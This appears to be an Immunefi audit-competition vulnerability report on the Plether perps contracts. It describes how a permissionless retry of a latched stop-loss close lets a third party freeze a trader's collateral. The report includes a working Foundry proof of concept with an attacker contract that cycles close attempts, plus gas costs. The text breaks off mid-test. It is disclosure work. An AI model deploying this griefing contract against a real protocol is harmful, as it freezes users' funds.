# \#98166 [SC-High] Permissionless retry lets anyone freeze a latched TP/SL position's collateral for 24+ hours, pre-empting the owner-only amendment added by the MED-9 fix

**Submitted on Nov 5th 2026 at 17:10:38 UTC by @andreeaaa for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98166
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours
  - Temporary freezing of funds for at least 1 hour

## Description

# Permissionless retry lets anyone freeze a latched TP/SL position's collateral for 24+ hours, pre-empting the owner-only amendment added by the MED-9 fix

## Brief/Intro

The MED-9 fix made every take-profit/stop-loss close attempt carry the trader's own financial ceilings: execution notional, gross debit, action charges and explicit fees. It also added one owner-only remedy for a ceiling that blocks the close, `amendLatchedPositionProtectionCloseLimits`: *"Tight limits may prevent execution until conditions improve or the owner amends them."*

That amendment is accepted only while the protection is `Latched` **and** the account queue is empty. `retryPositionProtectionClose` is permissionless. It moves the same protection back to `Triggered` with a live child that carries the **old** ceilings. While a protection is `Triggered` or `Latched`, the owner cannot cancel it, replace it, close manually, or cancel-and-close.

Any third party can therefore keep the owner out of the remedy for as long as it keeps re-queuing while the price stays beyond the owner's ceiling. In the frozen window the mark is fixed, so that is the whole window. Meanwhile the position collateral cannot be realized. The attacker needs no capital and only pays gas.

In the PoC (release parameters, 8M USDG pool):

| Scenario | Result | Without the attacker |
| --- | --- | --- |
| Weekend frozen window | **47 consecutive hours** with no exit. **4,953.35 USDG** of collateral is proven non-withdrawable. | The owner exits in the first hour. |
| Live market | **3 hours** with no exit. **5,953.73 USDG** of collateral is non-withdrawable. | The owner exits at the next tick (9,494.43 USDG). |

## Vulnerability Details

### 1. The remedy introduced by the MED-9 fix requires a state that any third party can destroy

`PositionProtectionBook.sol:315-329`:

```solidity
function amendLatchedPositionProtectionCloseLimits(uint64 protectionId, CloseFinancialLimits calldata limits) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionStatus.Latched) revert OrderRouter__ProtectionNotLatched();
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) revert OrderRouter__PendingOrdersExist();
    _setCloseLimits(protection, limits);
    ...
}
```

`PositionProtectionBook.sol:382-406`. The retry uses `_activeProtection`, which has no caller check:

```solidity
function retryPositionProtectionClose(uint64 protectionId) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);          // any caller
    if (protection.status != PositionProtectionStatus.Latched) revert OrderRouter__ProtectionNotLatched();
    ...
    if (router.pendingOrderCounts(protection.account) != 0) revert OrderRouter__PendingOrdersExist();
    ...
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER).commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    _recordCloseAttempt(protection, linkedOrderId);                                   // status = Triggered, old ceilings
}
```

A failing attempt relatches the protection (`handleFailedProtectionAttempt`, `:660-667`). An attacker resolves the live attempt with the permissionless keeper call `OrderRouter.executeOrder` and calls the retry in the same transaction. That transaction ends with the protection back in `Triggered`, so the owner never sees `Latched` with an empty queue between transactions. This core cycle is a single transaction and needs no ordering advantage.

Production runs an honest reference keeper that also resolves zero-bounty heads. Against it, the attacker runs a cron that resolves and re-queues, plus a backrunner that re-queues after any third-party resolution (668,749 gas per backrun). The backrun only needs to react to the sequencer feed faster than the owner's next transaction. `test_KeeperFirstOrderingAndPassiveExpiredLock` shows that ordering. An attempt that nobody resolves stays queued past its 60-second deadline, still counts in `pendingOrderCounts`, and keeps the protection `Triggered`.

### 2. No other single-call path leaves a triggered protection

Executed in `test_OwnerExitRevertReasonsWhileLocked`:

| Owner action | Result while an attempt is live |
| --- | --- |
| `amendLatchedPositionProtectionCloseLimits` | `OrderRouter__ProtectionNotLatched` |
| `retryPositionProtectionClose` by the owner | `OrderRouter__ProtectionNotLatched` |
| `cancelPositionProtection` (`_cancel` accepts only `PendingOpen`/`Armed`, `:408-420`) | `OrderRouter__ProtectionNotArmed` |
| `cancelPositionProtectionAndCommitClose` (`Armed` only, `:341-350`) | `OrderRouter__ProtectionNotArmed` |
| `OrderRouter.commitOrder` close (`enforceProtectionLock`, `OrderLiquidationBatchLogic.sol:131-136, 313-315`) | `OrderRouter__ProtectionActive` |
| `MarginClearinghouse.withdrawMargin(whole balance)` | Reverts, as for any open position. What the lock removes is the close that would release this collateral; in the control it is released within the first hour. |

`CfdEngine.addMargin` remains available, so the owner can keep the position solvent. What the owner cannot do is reduce or exit the position, realize its collateral, or change the ceilings that make every attempt fail.

### 3. Who is trapped

The documented remedy is a single owner call:

- the MED-9 resolution;
- `CANONICAL_ENTRYPOINTS.md:143-149`;
- the SDK action `buildAmendLatchedProtectionCloseLimitsAction`, which encodes exactly that one call.

An owner who uses it is trapped, whether through an EOA or through that SDK plan.

In practice, an owner escapes by composing, in one atomic transaction, a keeper execution of the attacker's live attempt with the amendment and a retry. The executed attempt fails and relatches the protection; the amendment and retry then follow in the same transaction. This composition is not documented anywhere as the remedy. It also needs the live attempt to be executable, which in a live market means supplying signed Pyth data for the first post-commit tick.

The PoC's attacker resolves once every 50 s and once per frozen hour, so such a batch has a wide window. An attacker that resolves each attempt as soon as it becomes executable narrows that window in a live market.

### 4. Why this is not a known limitation

- **CANONICAL_ENTRYPOINTS.md:143-149** documents the two facts separately: the amendment needs an empty queue, and a latched protection *"may be retried permissionlessly"*. It never says that a third party can thereby veto the owner's amendment.
- **The MED-9 resolution** presents the amendment as the owner's remedy. Tight ceilings are the intended use of that fix: MED-9 was raised because protection closes could pay fees or frozen spread beyond what the trader would authorize.
- **The AI-scan Low "Protection trigger bounty is paid before a zero-bounty close is executed"** has a different root cause: the bounty is paid at trigger time and the cancellation path is pre-trigger. It also predates the amendment, which was added in `eadc5c58` (#124, 2026-10-23). The scan ran on 2026-10-15.
- **MED-15** (zero execution price) and **MED-30** (no frozen-market trigger) are unrelated.

The issue is new behaviour introduced by the MED-9 fix: the remedy it added is defeated by the permissionless retry.

## Impact Details

**Severity: High — Temporary freezing of funds for at least 24 hours.** The PoC freezes the position collateral for **47 consecutive hours** across the weekend frozen window, where the fixed mark makes the lock independent of price. It also freezes it for 3 hours in a live market. The 1-hour freezing row is met in both scenarios.

| PoC scenario (release parameters, 8M USDG pool) | Result |
| --- | --- |
| Friday-afternoon gap through a stop-limit (5% margin), then the frozen window. The mark is fixed, so the lock does not depend on price. | **47 consecutive hours**, 0 successful owner exit calls, 47 attacker transactions. At hour 24, withdrawing the whole balance reverts; **4,953.35 USDG** of position collateral stays locked. Control: the owner amends and exits in the first hour. |
| Live market. 100k LONG, 1% margin, stop-limit ceiling at the stop, gap through it. The attacker cycles every 50 s. | **10,800 s locked**, 216 cycles, 0 successful owner exit calls. **5,953.73 USDG** of position collateral is non-withdrawable; the owner stays solvent through `addMargin`. |

The live lock lasts while the market stays beyond the owner's ceiling. If the price returns within the ceiling, the attempt executes and the lock ends. While it holds, the owner bears the market move. In the PoC's +0.50% path, the owner exits 475.16 USDG worse than in the control: 9,019.27 vs. 9,494.43 USDG on 100k notional.

Attacker cost is gas only:

| Action | Gas |
| --- | --- |
| Live cycle (resolve + retry) | 1,217,098 |
| Frozen cycle | 946,755 |
| Backrun retry | 668,749 |

At the Arbitrum One 0.01 gwei base-fee floor, the 3-hour live lock costs about 0.0026 ETH. If an honest keeper resolved the attempt every minute through the 47-hour weekend, about 2,820 backrun retries would be needed, roughly 0.019 ETH.

Every call is a permissionless keeper action: `executeOrder`, `expireOrder` and `retryPositionProtectionClose`. The program treats keepers as untrusted.

## Recommendation

Give the owner a remedy that a third party cannot pre-empt. For example:

- Accept the amendment while `Triggered` and apply it to the live child, or cancel the live child on amendment.
- Add an owner-only `amendAndRetry` that does not require an empty queue.
- Reserve retries for the owner for a grace period after a relatch.

## References

- `packages/perps/src/PositionProtectionBook.sol:315-329` (amendment), `:382-406` (permissionless retry), `:408-420` (cancel), `:341-350` (cancel and close), `:660-667` (relatch)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:131-136, 313-315` (`ProtectionActive` on public commits)
- `packages/perps/CANONICAL_ENTRYPOINTS.md:143-149`; `packages/perps/SECURITY.md:547-552`
- Cecuro AI audit, MED-9 finding and resolution
- Commit in scope: `a82d4fefb02768e5b3bddcc97dee371eee24fea8`


## Proof of Concept

# Proof of Concept

Runs in the repository's Foundry suite at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, with no change to in-scope contracts. Only `BasePerpTest`'s existing doubles are used: `MockPyth` and the mock settlement token. Risk parameters, the 8M USDG pool and Senior limits follow `packages/perps/DEPLOYMENT.md`.

The output below was produced on a pristine checkout of that commit, default `foundry.toml` profile, with only this file added.

## Steps

1. Save the file below as `packages/perps/test/perps/LatchedProtectionRetryLock.t.sol`.
2. From `packages/perps`, run:

```
forge test --match-contract LatchedProtectionRetryLockTest -vv
```

## What each test shows

| Test | Shows |
| --- | --- |
| `test_WeekendLockAtLeast24Hours` | A Friday-afternoon gap through a stop-limit, 5% margin. One attacker transaction per hour through the frozen window, with no Pyth data. 47 consecutive hours with no owner exit. At hour 24, withdrawing the whole balance reverts and the position collateral stays locked. |
| `test_Control_WeekendOwnerTakesFrozenClose` | Same weekend, no attacker. The owner amends in the first hour and takes the frozen close. |
| `test_OwnerHeldInPositionForThreeHours` | A 100k LONG, 1% margin, stop-limit ceiling at the stop, gap through it. `LatchLocker.cycle` resolves the live attempt and re-queues it in one transaction every 50 s for 3 h, while the index drifts +0.50%. After every cycle the owner tries every exit and all fail. The owner tops up margin with `addMargin` and stays solvent. The collateral is proven non-withdrawable. When the attacker stops, the owner amends, retries and exits at the drifted price. |
| `test_Control_OwnerAmendsAndExits` | Same gap, no attacker. The owner amends while `Latched`, retries and exits at the next tick. |
| `test_OwnerExitRevertReasonsWhileLocked` | The exact revert selector of each exit path. `addMargin` still works and does not release the lock. |
| `test_KeeperFirstOrderingAndPassiveExpiredLock` | An honest keeper resolves the attempt and the attacker's retry is the next transaction, so the owner's amendment fails. An expired, unresolved attempt still blocks the amendment. Gas of a backrun retry. |

## Test file

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

interface IRouterExecute {

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result);

}

/// @notice Attacker contract (any EOA can deploy it). One call resolves the live protection close attempt, which fails
///         on the owner's retained ceiling and relatches, and immediately re-queues a fresh attempt through the
///         permissionless retry. Between transactions the owner therefore never sees `Latched` with an empty queue.
contract LatchLocker {

    IRouterExecute internal immutable ROUTER;
    IPositionProtectionActions internal immutable BOOK;

    constructor(
        address router_,
        address book_
    ) {
        ROUTER = IRouterExecute(router_);
        BOOK = IPositionProtectionActions(book_);
    }

    function cycle(
        uint64 protectionId,
        uint64 liveAttemptId,
        bytes[] calldata pythUpdateData
    ) external payable returns (uint8 attemptStatus, uint64 nextAttemptId) {
        OrderV3Types.ExecutionResult memory r = ROUTER.executeOrder{value: msg.value}(liveAttemptId, pythUpdateData);
        attemptStatus = uint8(r.status);
        nextAttemptId = BOOK.retryPositionProtectionClose(protectionId);
    }

    receive() external payable {}

}

/// @notice PoC: the MED-9 fix lets only the owner relax a latched protection's close ceilings
///         (`amendLatchedPositionProtectionCloseLimits`), but that call requires `Latched` AND an empty account queue,
///         while `retryPositionProtectionClose` is permissionless and turns `Latched` back into `Triggered` with a live
///         child carrying the OLD ceilings. Any third party can therefore keep the owner out of the only exit the
///         protocol leaves them (cancel, manual close, add-margin and cancel+close are all rejected while a protection
///         is Triggered/Latched), until the position is liquidated.
///         Release parameters (packages/perps/DEPLOYMENT.md): maint 0.1%, init 0.2%, FAD 3%, fee 4 bps, 8M USDG pool.
contract LatchedProtectionRetryLockTest is BasePerpTest {

    address internal constant VICTIM = address(0x51C7);
    address internal constant ATTACKER = address(0xBADA);
    address internal constant KEEPER = address(0x4EE9);

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant NOTIONAL = 100_000e6; // 100k USDG LONG (LONG profits when the index falls)
    uint256 internal constant STOP = 1.003e8; // stop-loss 0.30% above entry
    uint256 internal constant GAP = 1.004e8; // first tick after the trigger, 0.10% through the stop

    IPositionProtectionActions internal pbook;
    IPositionProtectionViews internal pviews;
    IOrderLifecycleBook internal book;
    LatchLocker internal locker;
    uint256 internal size;
    bytes32 internal nonce;
    uint256 internal frozenCollateral;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        book = IOrderLifecycleBook(address(router.lifecycleBook()));
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(address(0x7E7E), 2_000_000e6);
        _fundSenior(address(0x5E5E), 6_000_000e6);
        for (uint256 i; i < 8 && (engine.isOracleFrozen() || engine.isFadWindow()); ++i) {
            vm.warp(vm.getBlockTimestamp() + 12 hours);
            vm.roll(vm.getBlockNumber() + 3600);
        }
        pbook = IPositionProtectionActions(router.positionProtectionBook());
        pviews = IPositionProtectionViews(router.positionProtectionBook());
        _fundTrader(VICTIM, 10_000e6);
        vm.deal(KEEPER, 10 ether);
        vm.deal(ATTACKER, 10 ether);
        locker = new LatchLocker(address(router), address(pbook));
        size = (NOTIONAL * 1e12 / 1e20) * 1e20;
    }

    // ------------------------------------------------------------------ helpers

    function _request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory request) {
        nonce = keccak256(abi.encode(nonce, side, sizeDelta, margin, isClose));
        request.clientOrderId = nonce;
        request.side = side;
        request.sizeDelta = sizeDelta;
        request.marginDelta = margin;
        request.targetPrice = isClose ? (side == CfdTypes.Side.LONG ? CAP_PRICE : 1) : (side == CfdTypes.Side.LONG ? 1 : CAP_PRICE);
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: book.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _refreshMark(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _status(
        uint64 pid
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return pviews.getPositionProtection(pid).status;
    }

    function _wide() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory l) {
        l.maxExecutionNotionalAssets = type(uint256).max;
        l.maxGrossAccountDebitAssets = type(uint256).max;
        l.maxActionChargeAssets = type(uint256).max;
        l.maxExplicitFeesAssets = type(uint256).max;
    }

    /// Owner opens a 100k LONG through the router and arms a stop-loss whose only ceiling is the execution notional
    /// at the stop (a stop-limit).
    function _openProtected(
        uint256 margin
    ) internal returns (uint64 pid) {
        _refreshMark(PRICE);
        OrderV3Types.OrderRequest memory req = _request(CfdTypes.Side.LONG, size, margin, false);
        vm.prank(VICTIM);
        uint64 id = router.commitOrder(req);
        vm.prank(KEEPER);
        router.executeOrder{value: 0.01 ether}(id, _mockPythUpdateData(PRICE));
        (uint256 opened,,,,,,) = engine.positions(VICTIM);
        assertEq(opened, size, "position open");
        _refreshMark(PRICE);
        PositionProtectionTypes.PositionProtectionParams memory pp;
        pp.stopLossTriggerPrice = STOP;
        pp.closeLimits = _wide();
        pp.closeLimits.maxExecutionNotionalAssets = (size * STOP) / 1e20;
        vm.prank(VICTIM);
        pid = pbook.createPositionProtection(pp);
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Armed), "armed");
    }

    /// A gap through the stop: an ordinary keeper triggers (paid from the owner's own 0.20 USDG reservation).
    function _gapTrigger(
        uint64 pid
    ) internal returns (uint64 attempt) {
        bytes[] memory data = _mockPythUpdateData(GAP);
        vm.prank(KEEPER);
        attempt = pbook.triggerPositionProtection{value: 0.01 ether}(pid, data);
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "triggered");
    }

    /// Every exit path the owner has (amend, cancel, own retry, manual close, cancel+close). Returns successes.
    function _ownerTriesEveryExit(
        uint64 pid
    ) internal returns (uint256 succeeded) {
        OrderV3Types.OrderRequest memory closeReq = _request(CfdTypes.Side.LONG, size, 0, true);
        vm.startPrank(VICTIM);
        try pbook.amendLatchedPositionProtectionCloseLimits(pid, _wide()) {
            ++succeeded;
        } catch {}
        try pbook.cancelPositionProtection(pid) {
            ++succeeded;
        } catch {}
        try pbook.retryPositionProtectionClose(pid) {
            ++succeeded;
        } catch {}
        try router.commitOrder(closeReq) {
            ++succeeded;
        } catch {}
        try pbook.cancelPositionProtectionAndCommitClose(pid, closeReq) {
            ++succeeded;
        } catch {}
        vm.stopPrank();
    }

    function _sel(
        bytes memory reason
    ) internal pure returns (bytes4 s) {
        if (reason.length >= 4) {
            s = bytes4(reason);
        }
    }

    /// While locked: withdrawing the whole clearinghouse balance reverts, the free part withdraws, and what stays is
    /// exactly the position collateral the owner cannot realize. Returns that amount.
    function _proveCollateralFrozen() internal returns (uint256 lockedAssets) {
        uint256 balance = clearinghouse.balanceAssets(VICTIM);
        lockedAssets = clearinghouse.lockedMarginAssets(VICTIM);
        vm.prank(VICTIM);
        try clearinghouse.withdrawMargin(balance) {
            fail();
        } catch {}
        uint256 freeAssets = balance - lockedAssets;
        if (freeAssets != 0) {
            vm.prank(VICTIM);
            clearinghouse.withdrawMargin(freeAssets);
        }
        // (the withdrawal hook first collects a few atoms of accrued carry from the pledge)
        lockedAssets = clearinghouse.lockedMarginAssets(VICTIM);
        assertEq(clearinghouse.balanceAssets(VICTIM), lockedAssets, "only the position collateral is left");
        assertGt(lockedAssets, 0, "position collateral is locked");
    }

    // ------------------------------------------------------------------ 1. owner held in the position (live market)

    /// One attacker cycle every 50 s (inside the 60 s attempt window) for 3 hours while the index drifts 0.5% against
    /// the LONG. The owner tops up margin with `CfdEngine.addMargin` so the position is never liquidatable, but every
    /// exit path fails for the whole period. When the attacker stops, the owner amends, retries and exits at the
    /// drifted price.
    function test_OwnerHeldInPositionForThreeHours() public {
        uint256 ownerStart = clearinghouse.balanceAssets(VICTIM);
        uint64 pid = _openProtected(1_000e6);
        uint64 attempt = _gapTrigger(pid);
        vm.prank(VICTIM);
        engine.addMargin(VICTIM, 5_000e6); // still available while locked; prevents liquidation, not the lock

        uint256 cycles;
        uint256 ownerExits;
        uint256 gasSpent;
        uint256 t0 = vm.getBlockTimestamp();
        uint256 px = GAP;
        while (vm.getBlockTimestamp() < t0 + 3 hours) {
            vm.warp(vm.getBlockTimestamp() + 49);
            px = GAP + ((vm.getBlockTimestamp() - t0) * 0.005e8) / 3 hours; // linear +0.50% over 3 h
            bytes[] memory data = _mockPythUpdateData(px);
            vm.prank(ATTACKER);
            uint256 g0 = gasleft();
            (uint8 st, uint64 next) = locker.cycle{value: 0.01 ether}(pid, attempt, data);
            gasSpent += g0 - gasleft();
            assertEq(st, uint8(OrderV3Types.LifecycleStatus.Failed), "attempt fails on the retained ceiling");
            attempt = next;
            ++cycles;
            ownerExits += _ownerTriesEveryExit(pid);
        }
        uint256 lockedFor = vm.getBlockTimestamp() - t0;
        (uint256 sizeLocked,,,,,,) = engine.positions(VICTIM);
        uint256 frozenLive = _proveCollateralFrozen();

        // Attacker stops. The owner can now clear the live attempt, amend and exit at the drifted price.
        bytes[] memory data2 = _mockPythUpdateData(px);
        vm.prank(KEEPER);
        router.executeOrder{value: 0.01 ether}(attempt, data2);
        vm.prank(VICTIM);
        pbook.amendLatchedPositionProtectionCloseLimits(pid, _wide());
        vm.prank(VICTIM);
        uint64 retry = pbook.retryPositionProtectionClose(pid);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder{value: 0.01 ether}(retry, _mockPythUpdateData(px));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "exit after the lock");
        (uint256 sizeAfter,,,,,,) = engine.positions(VICTIM);

        emit log_named_uint("seconds locked (live market)    ", lockedFor);
        emit log_named_uint("attacker cycles                 ", cycles);
        emit log_named_uint("owner exit calls that succeeded ", ownerExits);
        emit log_named_uint("attacker gas per cycle (live)   ", gasSpent / cycles);
        emit log_named_uint("position size during the lock   ", sizeLocked);
        emit log_named_uint("collateral frozen (USDG atoms)  ", frozenLive);
        emit log_named_uint("index when the owner got out    ", px);
        emit log_named_uint("owner USDG start                ", ownerStart);
        emit log_named_uint("owner USDG end (balance + withdrawn free)", clearinghouse.balanceAssets(VICTIM) + settlementToken.balanceOf(VICTIM));
        assertEq(ownerExits, 0, "no owner exit for three hours");
        assertGe(lockedFor, 3 hours, "locked at least three hours");
        assertEq(sizeLocked, size, "position held open");
        assertEq(sizeAfter, 0, "closed only after the attacker stopped");
    }

    /// Control: identical gap without the attacker. An ordinary keeper resolves the first attempt (fails, Latched,
    /// empty queue); the owner widens the ceiling as documented, retries, and exits at the next tick.
    function test_Control_OwnerAmendsAndExits() public {
        uint256 ownerStart = clearinghouse.balanceAssets(VICTIM);
        uint64 pid = _openProtected(1_000e6);
        uint64 attempt = _gapTrigger(pid);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder{value: 0.01 ether}(attempt, _mockPythUpdateData(GAP));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "first attempt fails on the ceiling");
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");
        vm.prank(VICTIM);
        pbook.amendLatchedPositionProtectionCloseLimits(pid, _wide());
        vm.prank(VICTIM);
        uint64 retry = pbook.retryPositionProtectionClose(pid);
        vm.prank(KEEPER);
        r = router.executeOrder{value: 0.01 ether}(retry, _mockPythUpdateData(GAP + 0.00025e8));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "owner exits");
        (uint256 sizeAfter,,,,,,) = engine.positions(VICTIM);
        emit log_named_uint("owner USDG start                ", ownerStart);
        emit log_named_uint("owner USDG end (control)        ", clearinghouse.balanceAssets(VICTIM));
        assertEq(sizeAfter, 0, "closed");
    }

    // ------------------------------------------------------------------ 2. why every exit fails

    function test_OwnerExitRevertReasonsWhileLocked() public {
        uint64 pid = _openProtected(1_000e6);
        uint64 attempt = _gapTrigger(pid);
        vm.prank(ATTACKER);
        locker.cycle{value: 0.01 ether}(pid, attempt, _mockPythUpdateData(GAP));

        OrderV3Types.OrderRequest memory closeReq = _request(CfdTypes.Side.LONG, size, 0, true);
        vm.startPrank(VICTIM);
        try pbook.amendLatchedPositionProtectionCloseLimits(pid, _wide()) {
            fail();
        } catch (bytes memory r) {
            assertEq(_sel(r), bytes4(keccak256("OrderRouter__ProtectionNotLatched()")), "amend");
        }
        try pbook.cancelPositionProtection(pid) {
            fail();
        } catch (bytes memory r) {
            assertEq(_sel(r), bytes4(keccak256("OrderRouter__ProtectionNotArmed()")), "cancel");
        }
        try pbook.retryPositionProtectionClose(pid) {
            fail();
        } catch (bytes memory r) {
            assertEq(_sel(r), bytes4(keccak256("OrderRouter__ProtectionNotLatched()")), "owner retry");
        }
        try router.commitOrder(closeReq) {
            fail();
        } catch (bytes memory r) {
            assertEq(_sel(r), bytes4(keccak256("OrderRouter__ProtectionActive()")), "manual close");
        }
        try pbook.cancelPositionProtectionAndCommitClose(pid, closeReq) {
            fail();
        } catch (bytes memory r) {
            assertEq(_sel(r), bytes4(keccak256("OrderRouter__ProtectionNotArmed()")), "cancel and close");
        }
        // Topping up margin is still possible (it defends against liquidation, it does not release the lock).
        engine.addMargin(VICTIM, 1_000e6);
        vm.stopPrank();
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "still locked");
    }

    // ------------------------------------------------------------------ 3. keeper-first ordering and passive lock

    function test_KeeperFirstOrderingAndPassiveExpiredLock() public {
        uint64 pid = _openProtected(1_000e6);
        uint64 attempt = _gapTrigger(pid);
        // An honest keeper resolves the attempt: Latched with an empty queue ...
        vm.prank(KEEPER);
        router.executeOrder{value: 0.01 ether}(attempt, _mockPythUpdateData(GAP));
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");
        // ... and the attacker's retry is the next transaction: the owner's amendment ordered after it reverts.
        vm.prank(ATTACKER);
        uint256 gr = gasleft();
        uint64 next = pbook.retryPositionProtectionClose(pid);
        emit log_named_uint("attacker gas, backrun retry only", gr - gasleft());
        vm.prank(VICTIM);
        vm.expectRevert(bytes4(keccak256("OrderRouter__ProtectionNotLatched()")));
        pbook.amendLatchedPositionProtectionCloseLimits(pid, _wide());

        // Passive lock: nobody touches the attempt; past its 60 s deadline it is still live in the account queue.
        vm.warp(vm.getBlockTimestamp() + 61);
        vm.roll(vm.getBlockNumber() + 1);
        assertEq(router.pendingOrderCounts(VICTIM), 1, "expired attempt still pending");
        vm.prank(VICTIM);
        vm.expectRevert(bytes4(keccak256("OrderRouter__ProtectionNotLatched()")));
        pbook.amendLatchedPositionProtectionCloseLimits(pid, _wide());
        // The owner must clear it in one transaction and amend in another; the attacker re-queues in between.
        vm.prank(VICTIM);
        router.expireOrder(next);
        vm.prank(ATTACKER);
        pbook.retryPositionProtectionClose(pid);
        vm.prank(VICTIM);
        vm.expectRevert(bytes4(keccak256("OrderRouter__ProtectionNotLatched()")));
        pbook.amendLatchedPositionProtectionCloseLimits(pid, _wide());
    }

    // ------------------------------------------------------------------ 4. a whole frozen weekend

    function _weekend(
        bool attack
    ) internal returns (uint256 lockedHours, uint256 ownerExits, uint256 cycles, uint64 pid) {
        uint256 gasSpent;
        pid = _openProtected(5_000e6); // 5% margin, above the 3% FAD/frozen requirement
        for (uint256 i; i < 800 && !engine.isFadWindow(); ++i) {
            vm.warp(vm.getBlockTimestamp() + 15 minutes);
            vm.roll(vm.getBlockNumber() + 1);
            _refreshMark(PRICE);
        }
        assertTrue(engine.isFadWindow() && !engine.isOracleFrozen(), "Friday FAD, live oracle");
        uint64 attempt = _gapTrigger(pid);
        vm.prank(KEEPER);
        router.executeOrder{value: 0.01 ether}(attempt, _mockPythUpdateData(GAP)); // fails on the ceiling
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");
        if (attack) {
            vm.prank(ATTACKER);
            attempt = pbook.retryPositionProtectionClose(pid);
        }
        for (uint256 h; h < 80; ++h) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            vm.roll(vm.getBlockNumber() + 1);
            if (!engine.isOracleFrozen() && !engine.isFadWindow()) {
                break;
            }
            if (attack && engine.isOracleFrozen()) {
                // Frozen execution needs no Pyth data: resolve at the frozen mark (fails on the ceiling) and re-queue.
                vm.prank(ATTACKER);
                uint256 g0 = gasleft();
                (, attempt) = locker.cycle(pid, attempt, new bytes[](0));
                gasSpent += g0 - gasleft();
                ++cycles;
            }
            uint256 s = _ownerTriesEveryExit(pid);
            if (attack && h == 24 && engine.isOracleFrozen()) {
                frozenCollateral = _proveCollateralFrozen();
            }
            if (s == 0) {
                ++lockedHours;
            } else {
                ownerExits += s;
                break;
            }
        }
        if (cycles != 0) {
            emit log_named_uint("attacker gas per cycle (frozen) ", gasSpent / cycles);
        }
    }

    function test_WeekendLockAtLeast24Hours() public {
        (uint256 lockedHours, uint256 exits, uint256 cycles, uint64 pid) = _weekend(true);
        (uint256 sizeAfter,,,,,,) = engine.positions(VICTIM);
        emit log_named_uint("consecutive hours, no owner exit", lockedHours);
        emit log_named_uint("owner exit calls that succeeded ", exits);
        emit log_named_uint("collateral frozen at hour 24    ", frozenCollateral);
        emit log_named_uint("attacker cycles (one per hour)  ", cycles);
        emit log_named_uint("oracle frozen at end (1=yes)    ", engine.isOracleFrozen() ? 1 : 0);
        emit log_named_uint("position open at end of window ", sizeAfter);
        emit log_named_uint("protection status (3=Triggered) ", uint8(_status(pid)));
        assertEq(exits, 0, "no exit through the frozen window");
        assertGe(lockedHours, 24, "locked at least 24 hours");
        assertGt(frozenCollateral, 0, "collateral proven frozen mid-weekend");
        assertEq(sizeAfter, size, "position not closed during the frozen window");
    }

    function test_Control_WeekendOwnerTakesFrozenClose() public {
